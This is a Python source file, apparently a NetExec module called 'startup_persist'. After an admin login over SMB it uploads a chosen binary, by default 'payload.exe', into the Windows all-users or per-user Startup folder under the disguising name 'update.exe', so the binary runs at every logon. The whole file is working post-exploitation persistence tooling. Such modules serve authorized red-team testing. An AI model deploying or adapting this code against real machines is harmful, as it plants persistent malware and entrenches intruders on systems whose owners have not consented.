from nxc.paths import DATA_PATH, TMP_PATH
from os.path import abspath, join
import os

class NXCModule:
    name = "startup_persist"
    description = "Copies a binary to the Windows startup folder for persistence (all users or specific user)"
    supported_protocols = ["smb"]
    opsec_safe = False  # Involves disk write, not opsec-safe
    multiple_hosts = True

    def options(self, context, module_options):
        """
        Define module options.
        FILEPATH: Local path to the binary to upload (default: ./payload.exe)
        FILENAME: Name of the binary in the startup folder (default: update.exe)
        USER: Target username for per-user persistence (default: None, uses all-users folder)
        CLEANUP: Delete the uploaded file after execution (default: False)
        """
        self.share = "C$"
        self.filepath = module_options.get("FILEPATH", abspath(join(os.getcwd(), "payload.exe")))
        self.filename = module_options.get("FILENAME", "update.exe")
        self.user = module_options.get("USER", None)
        self.cleanup = module_options.get("CLEANUP", "False").lower() == "true"

        # Validate filepath exists
        if not os.path.exists(self.filepath):
            context.log.error(f"File {self.filepath} does not exist")
            raise FileNotFoundError(f"File {self.filepath} not found")

    def on_admin_login(self, context, connection):
        """
        Executed after successful admin login.
        Copies the specified binary to the all-users or per-user startup folder.
        Optionally deletes the file if CLEANUP is True.
        """
        # Define the target path
        if self.user:
            startup_path = f"Users\\{self.user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{self.filename}"
            context.log.info(f"Targeting per-user startup folder for {self.user}")
        else:
            startup_path = f"ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\{self.filename}"
            context.log.info("Targeting all-users startup folder")

        try:
            # Open the local file for reading
            with open(self.filepath, "rb") as file:
                # Upload the file to the startup folder
                context.log.info(f"Uploading {self.filepath} to {startup_path}")
                connection.conn.putFile(self.share, startup_path, file.read)
                context.log.success(f"Successfully copied {self.filename} to startup folder: {startup_path}")

            # Optional cleanup
            if self.cleanup:
                try:
                    connection.conn.deleteFile(self.share, startup_path)
                    context.log.success(f"Cleaned up {self.filename} from {startup_path}")
                except Exception as e:
                    context.log.error(f"Failed to delete {self.filename}: {e}")

        except Exception as e:
            context.log.error(f"Failed to copy file to startup folder: {e}")
